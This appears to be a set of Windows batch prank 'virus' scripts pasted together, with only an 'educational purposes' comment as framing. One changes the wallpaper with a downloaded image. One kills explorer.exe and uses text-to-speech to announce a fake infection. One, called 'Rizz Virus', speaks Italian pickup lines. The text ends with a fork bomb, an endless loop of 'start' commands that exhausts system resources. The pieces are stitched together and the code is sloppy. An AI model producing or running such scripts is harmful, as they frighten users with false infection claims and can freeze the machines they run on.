@echo off
set IMG_URL=https://i.ytimg.com/vi/tzD9OxAHtzU/hq720_2.jpg
:: NOTE! FOR EDUCATIONAL PURPOSES ONLY
powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)" @echo off
color a
taskkill /f /im "explorer.exe"
:1
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
set "text=Hello your device is infected with Wanna Try, hit any key to proceed"
echo speech.speak "%text%" >> "speech.vbs"
start speech.vbs
:2
echo "ciao il tuo computer è stato infetto"
echo tocca un tasto per continure
pause
:3
del speech.Vbs
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
set "text=Lol sto scherzando sembravi te dopo aver preso un  brutto voto per la prima volta e lo devi dire ai tuoi genitori"
echo speech.speak "%text%" >> "speech.vbs"
start speech.vbs
:4
echo lol just kidding it was a prank
start explorer.exe
pause @echo off
title Rizz Virus
color F

:start
set text="Ciao, stai per essere rimorchiatp"
echo %text%
echo set speech = Wscript.CreateObject("SAPI.spVoice") > speech.vbs
echo speech.speak %text% >> speech.vbs
start speech.vbs
timeout 1 >nul


call :Attack "Hai un nome o posso chiamarti mio?"
call :Attack "I tuoi occhi sono come un oceano, e io sono perso in mare."
call :Attack "Se la bellezza fosse un crimine, staresti scontando una condanna a vita."
call :Attack "Sei un viaggiatore del tempo? Perche ti vedo nel mio futuro."
call :Attack "Sei una macchina fotografica? Perche ogni volta che ti guardo, sorrido."


:attack
cls
echo %~1
echo set speech = Wscript.CreateObject("SAPI.spVoice") > speech.vbs
echo speech.speak "%~1" >> speech.vbs
start speech.vbs
timeout 5 >nul
exit /b
md %random% | startvirus.bat
@echo off
:loop
start
start 
start
start
start
start
start
start
start
goto loop



